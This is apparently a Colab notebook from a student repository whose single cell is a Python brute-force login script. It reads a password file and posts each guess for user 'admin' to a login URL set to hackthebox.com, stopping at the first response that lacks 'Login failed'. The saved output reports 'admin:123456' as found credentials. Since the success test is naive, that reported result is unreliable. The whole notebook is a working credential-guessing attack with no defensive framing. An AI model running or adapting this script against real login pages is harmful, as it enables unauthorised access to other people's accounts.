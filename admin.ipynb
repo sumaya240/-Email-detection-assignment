{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "3YM6sQyhHfUZ",
        "outputId": "2f26ce20-201f-4877-e86f-981f064932d2"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Possible credentials found : admin:123456\n"
          ]
        }
      ],
      "source": [
        "import requests\n",
        "\n",
        "def brute_force_login(username,targeturl,password_list=\"/content/passwords.txt\"):\n",
        "  with open(password_list,\"r\") as file:\n",
        "    for password in file.readlines():\n",
        "      password=password.strip()\n",
        "      data={\"username\":username,\"password\":password}\n",
        "      response = requests.post(targeturl,data=data)\n",
        "      if \"Login failed\" not in response.text:\n",
        "        print(f\"Possible credentials found : {username}:{password}\")\n",
        "        return\n",
        "  print(\"No valid credentials found\")\n",
        "\n",
        "brute_force_login(\"admin\",\"https://hackthebox.com/login\")"
      ]
    }
  ]
}